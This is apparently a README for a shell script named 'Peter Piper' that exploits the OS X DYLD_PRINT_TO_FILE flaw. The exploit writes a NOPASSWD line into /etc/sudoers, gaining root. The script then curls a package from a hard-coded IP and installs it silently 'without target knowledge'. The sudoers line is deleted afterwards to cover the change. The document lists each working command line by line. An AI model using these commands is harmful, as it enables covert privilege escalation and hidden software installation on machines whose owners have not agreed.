# Peter Piper Documentation #

__1. INTRODUCTION__
<br>
This script was made as an alternative to legitimate authentication in Applescript. This script uses a method of exploitation in OS X called root piping.

<br>

__2. EXPLOIT__
<br>
This exploit uses a vulnerability that was properly fixed in OS X 10.10.5. It’s reference information is [here](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html).
This exploit gives whatever user that executes it admin instantly.

<br>

__3. INSTALL__
<br>
We use `cURL` to get the Java 8 Update 60 package (.tar archive) onto the target computer and into a temporary directory, decompress it, and then use the `installer` command featured in the OS X command line to install the .pkg we fetched. This is the correct command for this particular task because it skips the graphical installer meaning it can run behind the scenes without target knowledge.

<br>

__4. CLEANUP__
<br>
We first remove the temporary directory used to store the Java package during install, then we use the command `sed` to remove the target from the sudoers list.

<br>

__5. `function KeepSafe { }` & `trap`__
<br>
This is used to ensure the completion of the command if it fails.

<br>

<br>

## IN-DEPTH LOOK AT `function KeepSafe { }` COMMANDS ##

`echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;` ___- Exploit the machine___
<br>
`sudo bash -c ` ___- Create a root bash shell___
<br>
`if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1)";` ___- Check if the exploit actually worked, if not, exit the script___
<br>
`sudo mkdir -v /tmp$$;` ___- Make a temporary directory to store the package in___
<br>
`sudo curl -# http://24.96.42.83/ownCloud/index.php/s/MipN60plXKZ21vg/download > /tmp$$/Java8Update60.pkg.tar;` ___- Get the package (.tar archive)___
<br>
`tar -xfv /tmp$$/Java8Update60.pkg.tar;` ___- Unpack the .tar archive___
<br>
`sudo installer -verbose -pkg /tmp$$/Java8Update60.pkg -target LocalSystem;` - ___Install the package___
<br>
`sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers;` ___- Remove the line allowing root access without a password___
<br>
`rm -rfv /tmp$$;` ___- Remove the temporary directory___
